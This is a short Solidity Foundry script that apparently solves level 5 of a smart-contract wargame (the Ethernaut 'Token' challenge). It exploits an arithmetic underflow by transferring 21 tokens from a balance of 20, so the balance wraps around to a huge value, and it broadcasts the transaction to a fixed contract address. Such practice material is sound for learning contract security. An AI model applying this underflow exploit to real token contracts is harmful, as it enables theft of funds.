// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/level5.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice arithmetic underflow
contract Level5Solution is Script {
    Token public level = Token(0xF9dd1B32B912b92776035A1b2DeC9C5e15EA6C38);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        ///@notice: token_balance=20. By minusing 21 will cause an underflow
        level.transfer(address(0), 21);
        console.log("myBalance: ", level.balanceOf(vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }
    

}
